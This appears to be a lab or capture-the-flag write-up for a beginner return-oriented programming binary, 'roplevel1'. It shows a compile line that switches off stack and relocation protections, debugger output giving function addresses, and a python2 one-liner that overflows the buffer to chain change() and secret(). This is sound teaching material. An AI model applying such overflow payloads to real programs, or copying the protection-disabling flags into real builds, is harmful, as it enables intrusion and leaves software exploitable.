How to compile binary:

`gcc roplevel1.c -o roplevel1 -fno-stack-protector -z execstack -m32 -no-pie -Wl,-z,norelro -mpreferred-stack-boundary=2`

Analysis:

```
pwndbg> x secret
0x80491bb <secret>:	0x53e58955
pwndbg> x change
0x8049186 <change>:	0x53e58955
```

Methodolody:

Chain change() and secret() one after the other such that when the main function finishes is returning, it will return to the change function. WHen the change function finishes and is returning, it returns to the secret() function.

Answer:

`python2 -c "print('A' * 20 + '\x86\x91\x04\x08\xbb\x91\x04\x08' + 'B'*20)" | ./roplevel1`

- you have python2 and python3 installed on your system, make sure to run the exploit with python2 as python2 and python3 interpret byte strings `"\x$$"` differently as seen [here](https://stackoverflow.com/questions/60660568/overflowed-bytes-different-than-those-i-see-on-gdb)

- To ensure that the binaries are compiled and are functioning as close to what the author intended, use [checksec.rs](https://github.com/etke/checksec.rs) on the Mach-O executables (original ones) and [checksec.sh](https://github.com/slimm609/checksec.sh) on your elf executables and ensure that the security properties of both executables are as similar as possible